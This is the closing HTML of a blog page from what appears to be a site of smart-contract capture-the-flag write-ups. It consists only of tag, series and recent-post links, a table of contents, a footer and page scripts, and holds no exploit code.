</a><a href=/tags/msg.sender-vs-tx.origin/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Msg.sender vs Tx.origin">Msg.sender vs Tx.origin
</a><a href=/tags/assembly/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title=Assembly>Assembly
</a><a href=/tags/calldata-manipulation/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Calldata Manipulation">Calldata Manipulation
</a><a href=/tags/decentralized-exchange/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Decentralized Exchange">Decentralized Exchange
</a><a href=/tags/denial-of-service/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Denial of Service">Denial of Service
</a><a href=https://s4bot3ur.github.io/tags class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title=ALL>ALL
<span class="badge badge-sm text-secondary bg-white ms-1">25</span></a></div><div class=tab-pane id=taxonomySeries role=tabpanel aria-labelledby=taxonomySeriesTab tabindex=0><a href=/series/ethernaut/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-series me-2 mb-2" title=Ethernaut>Ethernaut
</a><a href=/series/tcp1p-2024/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-series me-2 mb-2" title=TCP1P-2024>TCP1P-2024
</a><a href=/series/war-games-ctf/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-series me-2 mb-2" title=War-Games-CTF>War-Games-CTF
</a><a href=/series/damn-vulnerable-defi/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-series me-2 mb-2" title=Damn-Vulnerable-Defi>Damn-Vulnerable-Defi
</a><a href=/series/r3-ctf-2025/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-series me-2 mb-2" title=R3-CTF-2025>R3-CTF-2025</a></div><div class=tab-pane id=taxonomyArchives role=tabpanel aria-labelledby=taxonomyArchivesTab tabindex=0><a href class="btn btn-sm btn-secondary post-taxonomy ps-3 me-2 mb-2" title=2025>2025 <span class="badge badge-sm text-secondary bg-white ms-1">1</span>
</a><a href class="btn btn-sm btn-secondary post-taxonomy ps-3 me-2 mb-2" title=2024>2024 <span class="badge badge-sm text-secondary bg-white ms-1">40</span></a></div></div></div></div></div><div class="accordion posts-toggle"><div class="row card component accordion-item"><div class="accordion-header card-header border-0"><a class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent" role=button data-bs-toggle=collapse href=#posts-toggle aria-expanded=true aria-controls=posts-toggle>Posts</a></div><div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id=posts-toggle><ul class="nav nav-pills nav-fill" role=tablist><li class=nav-item role=presentation><button class="nav-link active" id=recent-posts-tab data-bs-toggle=tab data-bs-target=#recent-posts type=button role=tab aria-controls=recent-posts aria-selected=true>
Recent Posts</button></li></ul><div class="tab-content mt-3"><div class="tab-pane active" id=recent-posts role=tabpanel aria-labelledby=recent-posts-tab tabindex=0><ul class="post-list list-unstyled ms-1"><li class=mb-2><div class=d-flex><div class="flex-grow-1 d-flex flex-column h-auto justify-content-center"><a class=post-title href=/blogs/r3-ctf-2025/signin/>Signin</a><div class="post-meta mt-2"><span class=post-date>July 16, 2025</span></div></div></div></li><li class=mb-2><div class=d-flex><div class="flex-grow-1 d-flex flex-column h-auto justify-content-center"><a class=post-title href=/blogs/war-games-ctf/bank-vault/>Bank Vault</a><div class="post-meta mt-2"><span class=post-date>December 30, 2024</span></div></div></div></li><li class=mb-2><div class=d-flex><div class="flex-grow-1 d-flex flex-column h-auto justify-content-center"><a class=post-title href=/blogs/war-games-ctf/death-star/>Death Star</a><div class="post-meta mt-2"><span class=post-date>December 30, 2024</span></div></div></div></li><li class=mb-2><div class=d-flex><div class="flex-grow-1 d-flex flex-column h-auto justify-content-center"><a class=post-title href=/blogs/war-games-ctf/guess-it/>Guess It</a><div class="post-meta mt-2"><span class=post-date>December 30, 2024</span></div></div></div></li><li class=mb-2><div class=d-flex><div class="flex-grow-1 d-flex flex-column h-auto justify-content-center"><a class=post-title href=/blogs/war-games-ctf/dungeons-and-naga/>Dungeons and Naga</a><div class="post-meta mt-2"><span class=post-date>December 30, 2024</span></div></div></div></li></ul></div></div></div></div></div><div class="accordion post-toc d-none d-lg-block"><div class="accordion-item row mb-4 card component" id=postTOC><div class="card-header accordion-header"><h2 class="card-title fs-4 my-2 text-surface d-none d-lg-block">Contents</h2><a class="accordion-button d-lg-none mb-1 collapsed shadow-none p-0 bg-transparent" role=button data-bs-toggle=collapse href=#post-toc aria-expanded=false aria-controls=post-toc>Contents</a></div><div class="card-body collapse accordion-collapse accordion-body d-lg-block" id=post-toc><nav id=TableOfContents><ul><li><ul><li><a href=#challenge-description>Challenge Description</a></li><li><a href=#key-concepts-to-learn>Key Concepts To Learn</a></li><li><a href=#contract-explanation>Contract Explanation</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#key-takeaways>Key Takeaways</a></li></ul></li></ul></nav></div></div></div></div></aside></div></main><footer class="footer mt-auto py-3 text-center container"><div class="offcanvas offcanvas-bottom h-auto" tabindex=-1 id=offcanvasActionsPanel aria-labelledby=offcanvasActionsPanelLabel><div class=offcanvas-header><div class="offcanvas-title h5" id=offcanvasActionsPanelLabel><i class="fas fa-fw fa-th-large me-1"></i>
Actions</div><button type=button class="btn-close ms-auto" data-bs-dismiss=offcanvas data-bs-target=offcanvasActionsPanel aria-label=Close></button></div><div class="offcanvas-body mt-2"><div class="actions d-flex overflow-auto align-items-center"><a role=button class="action action-go-back d-flex flex-column align-items-center me-3" href="javascript: window.history.back();"><span class="action-icon mb-2"><i class="fas fa-2x fa-chevron-circle-down" data-fa-transform=rotate-90></i></span> Go back
</a><a role=button class="action action-reload-page d-flex flex-column align-items-center me-3"><span class="action-icon mb-2"><i class="fas fa-2x fa-redo-alt"></i></span> Reload
</a><a role=button class="action action-copy-url d-flex flex-column align-items-center me-3"><span class="action-icon mb-2"><i class="fas fa-2x fa-link"></i></span> Copy URL</a></div></div></div><div class="row text-center"><div class="col-12 mt-2"><p class=mb-2>S4b03ur's Website</p><p class="text-secondary mb-2"><small></small></p><div class="copyright mb-2 text-secondary"><small>Copyright © 2024-2025 s4bot3ur. All Rights Reserved.</small></div><nav class="social-links nav justify-content-center mb-2 mt-3"><a class="nav-link social-link p-0 me-1 mb-2" href=mailto:s4bot3ur.x.t0r4n4d0@gmail.com title=Email><i class="fas fa-fw fa-2x fa-envelope" style=color:#0963ac></i>
</a><a class="nav-link social-link p-0 me-1 mb-2" target=_blank href=https://github.com/s4bot3ur title=GitHub rel=me><i class="fa-fw fa-2x fab fa-github"></i>
</a><a class="nav-link social-link p-0 me-1 mb-2" target=_blank href=https://twitter.com/s4bot3ur title=Twitter rel=me><i class="fa-fw fa-2x fab fa-twitter" style=color:#1d9bf0></i>
</a><a class="nav-link social-link p-0 me-1 mb-2" target=_blank href=/index.xml title=RSS rel=me><i class="fas fa-fw fa-2x fa-rss" style=color:#ea6221></i></a></nav></div><div class="col-12 col-lg-8 offset-0 offset-lg-1"></div></div></footer><script data-precache src=/assets/main/bundle.min.c8143ded9867b7480981d8377cdbc1f332a8eebe6a1f319351f966f94a4833da.js integrity="sha256-yBQ97Zhnt0gJgdg3fNvB8zKo7r5qHzGTUflm+UpIM9o=" crossorigin=anonymous async></script><script data-precache src=/assets/icons/bundle.min.f72634cee69eabf9716c1b6c273ad4157e7fade4f44c9cb1a86276f2f0aa5028.js integrity="sha256-9yY0zuaeq/lxbBtsJzrUFX5/reT0TJyxqGJ28vCqUCg=" crossorigin=anonymous defer></script><script data-precache src=/assets/viewer/bundle.min.06371891cfe6d10d36cba465c61c4d7cb17591a3be2fd9af4a38444d2074e709.js integrity="sha256-BjcYkc/m0Q02y6RlxhxNfLF1kaO+L9mvSjhETSB05wk=" crossorigin=anonymous defer></script><script src=https://giscus.app/client.js data-repo=s4bot3ur/Blockchain-Challenges data-repo-id=R_kgDOMw_Cqw data-category=General data-category-id=DIC_kwDOMw_Cq84Ci9GY data-mapping=title data-reactions-enabled=1 data-emit-metadata=1 data-input-position=top data-theme=preferred_color_scheme data-lang=en data-loading=lazy crossorigin=anonymous defer></script></body><script>document.addEventListener("DOMContentLoaded",()=>{document.querySelectorAll("pre").forEach(e=>{const t=document.createElement("button");t.innerText="Copy",t.classList.add("copy-button"),e.appendChild(t),t.addEventListener("click",()=>{const n=e.querySelector("code").innerText;navigator.clipboard.writeText(n).then(()=>{t.innerText="Copied!",setTimeout(()=>{t.innerText="Copy"},2e3)})})})})</script></html>